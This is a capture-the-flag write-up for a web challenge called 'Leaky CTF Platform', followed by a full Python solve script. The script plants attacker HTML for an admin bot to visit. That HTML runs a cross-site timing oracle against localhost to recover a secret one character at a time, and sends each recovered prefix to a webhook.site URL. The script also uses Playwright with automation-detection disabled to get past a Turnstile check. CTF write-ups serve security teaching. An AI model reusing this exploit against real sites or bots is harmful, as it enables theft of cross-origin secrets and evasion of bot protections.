# Leaky CTF Platform

- Category: Web
- Flag: `PUCTF26{Another_XS_Leaks_Timing_Oracle_Thanks_bliutech_from_LA_CTF_2026_tD6C0Sy696ePhYQVZmQ6yIKFXEfDN1sq}`

## Tools Used
- Python
- requests
- Playwright
- Webhook.site
- httpbin `/base64/`

## Vulnerabilities Exploited
1. Secret-dependent early exit in `/search` created a timing oracle.
2. `/spam_flags` let us amplify the timing difference to nearly one million entries.
3. The admin bot visited attacker HTML and carried a `SameSite=Lax` cookie for top-level navigations to `localhost`.

## Solve Process
1. Read the source and found `/search` checks `startswith()` against a hidden flag and exits early on success.
2. Used `/spam_flags` repeatedly so wrong guesses take much longer than correct guesses.
3. Built attacker HTML that the bot visits. The HTML opens a popup, navigates it to `http://localhost:5000/search?flag=<guess>`, and measures how long it takes before the popup becomes cross-origin.
4. For each next hex nibble of `leakyctf{????????}`, the payload tested all 16 candidates three times and chose the candidate with the lowest median timing.
5. The attacker payload exfiltrated progress and the final recovered `CORRECT_FLAG` to Webhook.site.
6. Submitted the recovered flag to `/submit_flag` and received the real flag.

## Solve Script

```python
import asyncio
import base64
import re
import sys
import time
import requests
from playwright.async_api import async_playwright
BASE_URL = sys.argv[1] if len(sys.argv) > 1 else 'http://chal.polyuctf.com:47116'
WEBHOOK_URL = 'https://webhook.site'
HEX = '0123456789abcdef'
SPAM_SIZE = 100000
SPAM_DELAY = 1.1
POLL_INTERVAL = 3
POLL_TIMEOUT = 120
REPORT_ATTEMPTS = 3
def build_payload(token_id: str) -> str:
    return f'''<!doctype html>
<meta charset="utf-8">
<body>running...</body>
<script>
const TOKEN = {token_id!r};
const TARGET = 'http://localhost:5000';
const HEX = {HEX!r};
function sleep(ms) {{
  return new Promise(resolve => setTimeout(resolve, ms));
}}
function beacon(path, params = {{}}) {{
  const url = new URL(`https://webhook.site/${{TOKEN}}/${{path}}`);
  for (const [k, v] of Object.entries(params)) url.searchParams.set(k, String(v));
  url.searchParams.set('t', String(Date.now()));
  url.searchParams.set('r', String(Math.random()));
  new Image().src = url.toString();
}}
async function measure(prefix) {{
  const win = window.open('about:blank', '', 'popup,width=200,height=200');
  if (!win) throw new Error('window.open failed');
  const start = performance.now();
  win.location = TARGET + '/search?flag=' + encodeURIComponent(prefix) + '&n=' + Math.random();
  while (true) {{
    try {{
      void win.origin;
    }} catch (e) {{
      break;
    }}
    await sleep(0);
  }}
  const elapsed = performance.now() - start;
  win.close();
  return elapsed;
}}
async function recoverNext(prefix) {{
  const scores = [];
  for (const ch of HEX) {{
    const candidate = prefix + ch;
    const times = [];
    for (let i = 0; i < 3; i++) times.push(await measure(candidate));
    times.sort((a, b) => a - b);
    scores.push({{ ch, score: times[1], times }});
  }}
  scores.sort((a, b) => a.score - b.score);
  beacon('step', {{
    prefix,
    best: scores[0].ch,
    bestScore: scores[0].score,
    second: scores[1].ch,
    secondScore: scores[1].score,
  }});
  return scores[0].ch;
}}
async function main() {{
  try {{
    beacon('start');
    let flag = 'leakyctf{{';
    for (let i = 0; i < 8; i++) {{
      flag += await recoverNext(flag);
      beacon('prefix', {{ value: flag }});
    }}
    flag += '}}';
    document.body.textContent = flag;
    beacon('done', {{ flag }});
  }} catch (e) {{
    document.body.textContent = 'error';
    beacon('error', {{ msg: e && e.message ? e.message : String(e) }});
  }}
}}
main();
</script>'''
def create_webhook_token(session: requests.Session):
    resp = session.post(
        f'{WEBHOOK_URL}/token',
        json={'default_content': 'placeholder', 'default_content_type': 'text/html'},
        timeout=20,
    )
    resp.raise_for_status()
    token_id = resp.json()['uuid']
    html = build_payload(token_id)
    resp = session.put(
        f'{WEBHOOK_URL}/token/{token_id}',
        headers={'Accept': 'application/json', 'Content-Type': 'application/json'},
        json={'default_content': html, 'default_content_type': 'text/html'},
        timeout=20,
    )
    resp.raise_for_status()
    return token_id, f'{WEBHOOK_URL}/{token_id}'
def wrap_payload_url(token_id: str) -> str:
    html = build_payload(token_id)
    encoded = base64.urlsafe_b64encode(html.encode()).decode()
    return f'https://httpbin.org/base64/{encoded}'
def spam_flags(session: requests.Session):
    for _ in range(11):
        resp = session.get(f'{BASE_URL}/spam_flags', params={'size': SPAM_SIZE}, timeout=30)
        if resp.status_code != 200:
            if 'exceed the maximum' in resp.text:
                break
            raise RuntimeError(resp.text)
        time.sleep(SPAM_DELAY)
async def _get_turnstile_token() -> str:
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=False,
            args=['--disable-blink-features=AutomationControlled'],
        )
        page = await browser.new_page()
        await page.goto(f'{BASE_URL}/report', wait_until='load', timeout=30000)
        await page.wait_for_function(
            "document.querySelector('#cf-turnstile-response') && document.querySelector('#cf-turnstile-response').value.length > 0",
            timeout=45000,
        )
        token = await page.locator('#cf-turnstile-response').input_value()
        await browser.close()
        return token
def submit_report(session: requests.Session, url: str):
    answer = asyncio.run(_get_turnstile_token())
    return session.post(f'{BASE_URL}/report', data={'url': url, 'answer': answer}, timeout=30)
def poll_webhook(session: requests.Session, token_id: str):
    seen = set()
    deadline = time.time() + POLL_TIMEOUT
    while time.time() < deadline:
        resp = session.get(
            f'{WEBHOOK_URL}/token/{token_id}/requests',
            headers={'Accept': 'application/json', 'Content-Type': 'application/json'},
            timeout=20,
        )
        resp.raise_for_status()
        items = resp.json().get('data', [])
        for item in reversed(items):
            req_id = item['uuid']
            if req_id in seen:
                continue
            seen.add(req_id)
            url = item.get('url', '')
            query = item.get('query', {})
            if '/done?' in url and 'flag' in query:
                return query['flag']
        time.sleep(POLL_INTERVAL)
    return None
def fetch_real_flag(session: requests.Session, correct_flag: str):
    resp = session.get(f'{BASE_URL}/submit_flag', params={'flag': correct_flag}, timeout=20)
    return re.search(r'(PUCTF26\{[^}]+\})', resp.text).group(1)
def main():
    session = requests.Session()
    spam_flags(session)
    token_id, _ = create_webhook_token(session)
    exploit_url = wrap_payload_url(token_id)
    leaked = None
    for attempt in range(REPORT_ATTEMPTS):
        resp = submit_report(session, exploit_url)
        if resp.status_code not in (200, 504):
            raise RuntimeError(resp.text)
        leaked = poll_webhook(session, token_id)
        if leaked:
            break
        if attempt + 1 != REPORT_ATTEMPTS:
            time.sleep(35)
    print(fetch_real_flag(session, leaked))
if __name__ == '__main__':
    main()
```